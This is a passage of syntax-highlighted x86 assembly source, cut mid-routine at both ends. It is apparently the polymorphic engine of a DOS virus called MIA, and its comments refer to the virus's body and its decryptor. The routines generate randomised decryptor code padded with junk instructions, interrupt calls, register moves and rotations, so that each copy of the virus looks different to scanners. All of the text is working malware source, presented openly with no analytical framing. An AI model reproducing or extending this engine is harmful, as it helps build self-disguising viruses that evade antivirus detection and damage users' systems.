 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 2 to 5 instructions please...</span><span class="sc0">

</span><span class="sc5">Fill</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encoder</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Operator</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">        </span><span class="sc1">; So don't generate interrupt calls within</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Neutral</span><span class="sc0">                </span><span class="sc1">; decryption loop, branch if not in loop yet</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Skip 2 subroutines</span><span class="sc0">

</span><span class="sc5">Neutral</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Random in range</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Operator</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">Overflow</span><span class="sc0">               </span><span class="sc1">; What the hex!</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Fill</span><span class="sc0">

</span><span class="sc5">Overflow</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Future_Generation</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Next part of decryptor</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Time_To_Build</span><span class="sc0">          </span><span class="sc1">; Empty? time to build!</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Store_No_Call</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Store_No_Call</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">                </span><span class="sc1">; Create a near call</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; A call to a subroutine</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">     </span><span class="sc1">; And empty buffer</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Garbage_Stack</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; Generate garbage between PUSH and POP</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Push_Pop</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with junks</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Entrance</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Make one decryptor instruction</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Rotate a bit to the left</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Fractions</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Time_To_Build</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Entrance</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Single</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Put one-byte junks</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Ones</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Ones</span><span class="sc0">

</span><span class="sc5">Interrupts</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Random number between from zero to AX</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Pop caller's next IP into CX</span><span class="sc0">
 </span><span class="sc6">xlat</span><span class="sc0">                          </span><span class="sc1">; Load a one-byte opcode</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Push again caller's next IP</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Insert_Nothing</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Delved</span><span class="sc0">                 </span><span class="sc1">; Is it gonna be put between NEG/NOT opcode?</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc0">                </span><span class="sc1">; INT 03h ? (needs stack)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Single</span><span class="sc0">                 </span><span class="sc1">; Take another opcode</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CEh</span><span class="sc0">                </span><span class="sc1">; INTO ? (ditto)</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Single</span><span class="sc0">                 </span><span class="sc1">; Yeah, obtain another opcode</span><span class="sc0">

</span><span class="sc5">Delved</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Store an opcode</span><span class="sc0">

</span><span class="sc5">Used</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">Invoke</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; Make an interrrupt calls</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Used</span><span class="sc0">                   </span><span class="sc1">; Don't generate two interrupts in same row</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Ones</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multimax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multimax</span><span class="sc0">     </span><span class="sc1">; Choose random interrupts from table</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Interrupts</span><span class="sc0">

</span><span class="sc5">Resource</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Generate INT calls with certain AH/AX value</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Offhand</span><span class="sc0">                </span><span class="sc1">; Determine, use AH or AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; So use AH</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wordz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bytez</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bytez</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">movsb</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Trickle</span><span class="sc0">

</span><span class="sc5">Offhand</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">; MOV AX,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Multimax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wordz</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wordz</span><span class="sc0">        </span><span class="sc1">; Get a word from table</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">movsw</span><span class="sc0">                         </span><span class="sc1">; Put in decryptor</span><span class="sc0">

</span><span class="sc5">Trickle</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; INT opcode</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">movsb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Mover</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Make a junk inter-registers MOV</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3F01h</span><span class="sc0">               </span><span class="sc1">; A 8/16-bit register...</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C08Ah</span><span class="sc0">              </span><span class="sc1">; Of course a MOV  XX,YY</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; 8-bit?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Othertype</span><span class="sc0">              
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc0">                </span><span class="sc1">; AX, BX, CX, DX ?</span><span class="sc0">

</span><span class="sc5">Othertype</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Don't care if source equals destination</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Immediate</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Make a MOV with immediate value</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc9">Bits</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Get a random word</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">Bits</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Put immediate byte</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Reference</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Create a MOV with memory reference</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Compound</span><span class="sc0">               </span><span class="sc1">; May MIA use any segment override?</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3803h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0688h</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Byte or word pointer?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Eight_Bits</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">

</span><span class="sc5">Eight_Bits</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Move into or from memory?</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Irremovable</span><span class="sc0">            </span><span class="sc1">; Branch if into memory</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Segmented</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Also random memory address</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Rejoin</span><span class="sc0">           </span><span class="sc1">; Why should jump?</span><span class="sc0">

</span><span class="sc5">Irremovable</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Be careful not to overwrite My baby's codes</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BootStrap</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">  </span><span class="sc1">; Point to unused gap inside MIA's body</span><span class="sc0">

</span><span class="sc5">Rejoin</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Compute</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Generate random calculation with memory</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Reference</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Point back to instruction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">                 </span><span class="sc1">; One math opcode</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Exchanger</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Do a XCHG  XX,YY</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Mover</span><span class="sc0">                  </span><span class="sc1">; Generate MOV version</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Point to that instruction again</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Was it a 8-bit or 16-bit MOV ?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">                 </span><span class="sc1">; 8-bit XCHG opcode</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Corrected</span><span class="sc0">              </span><span class="sc1">; Jump if 8-bit</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Swap it to 16-bit</span><span class="sc0">

</span><span class="sc5">Corrected</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Rotation</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Generate ROL/ROR/SAL/SAR/RCL/RCR  XX,CL/01</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">               </span><span class="sc1">; Random [0..4] (Get AX, BX, CX, DX, or SP ??)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; SP register?</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Fine</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Don't mess with SP!! use BP instead</span><span class="sc0">

</span><span class="sc5">Fine</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Save it</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Get random word</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D8D3h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C0D1h</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">; Set up register</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Effective</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Create a load-effective-address instruction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0040h</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; Input from PIT counter 0</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jp</span><span class="sc0">     </span><span class="sc5">Confused</span><span class="sc0">               
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
